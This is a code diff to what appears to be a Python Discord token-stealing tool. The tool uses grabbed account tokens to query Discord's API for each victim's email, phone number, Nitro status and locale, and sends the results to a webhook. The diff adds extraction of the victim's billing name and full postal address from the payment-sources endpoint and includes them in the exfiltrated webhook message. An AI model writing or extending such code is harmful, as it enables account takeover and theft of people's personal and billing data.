@@ -118,10 +118,38 @@ def BillingCheck(token):
         'Content-Type': 'application/json'
     }
     info = get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
+    print(info)
     if len(info) > 0:
-        return True
+        billing_info = []
+
+        addr = info[0]['billing_address']
+
+        name = addr['name']
+        billing_info.append(name)
+
+        address_1 = addr['line_1']
+        billing_info.append(address_1)
+
+        address_2 = addr['line_2']
+        billing_info.append(address_2)
+
+        city = addr['city']
+        billing_info.append(city)
+
+        postal_code = addr['postal_code']
+        billing_info.append(postal_code)
+
+        state = addr['state']
+        billing_info.append(state)
+
+        country = addr['country']
+        billing_info.append(country)
+
+        print(billing_info)
+
+        return True, billing_info
     else:
-        return False
+        return False, info
 
 def NitroCheck(token):
     headers = {
@@ -207,7 +235,8 @@ def SendTokens(webhook_url, tokens_grabbed = None):
         email          = GetEmail(token)
         phone_number   = GetPhoneNumber(token)
         verified_check = VerifiedCheck(token)
-        billing        = BillingCheck(token)
+        billing        = BillingCheck(token)[0]
+        billing_info   = BillingCheck(token)[1]
         nitro          = NitroCheck(token)[0]
         locale         = GetLocale(token)[0]
         language       = GetLocale(token)[1]
@@ -222,14 +251,27 @@ Email      = {email}
 Phone      = {phone_number}
 Verified   = {verified_check}
 Billing    = {billing}
-Nitro      = {nitro}
+'''
+
+        if billing == True:
+            name        = billing_info[0]
+            address_1   = billing_info[1]
+            address_2   = billing_info[2]
+            city        = billing_info[3]
+            postal_code = billing_info[4]
+            state       = billing_info[5]
+            country     = billing_info[6]
+
+            embed[0]['description'] += f'\nName           = {name}\nAddress Line 1 = {address_1}\nAddress Line 2 = {address_2}\nCity           = {city}\nPostal Code    = {postal_code}\nState          = {state}\nCountry        = {country}\n\n'
+
+        embed[0]['description'] += f'''Nitro      = {nitro}
 '''
 
         if nitro == True:
             nitrostart  = NitroCheck(token)[1]
             nitroend    = NitroCheck(token)[2]
             daysofnitro = NitroCheck(token)[3]
-            embed[0]['description'] += f'\nNitro Started = {nitrostart}\nNitro Ends = {nitroend}\nDays Left = {daysofnitro}\n\n'
+            embed[0]['description'] += f'\nNitro Started = {nitrostart}\nNitro Ends    = {nitroend}\nDays Left     = {daysofnitro}\n\n'
 
         embed[0]['description'] += f'''Locale     = {locale}
 Language   = {language}'''
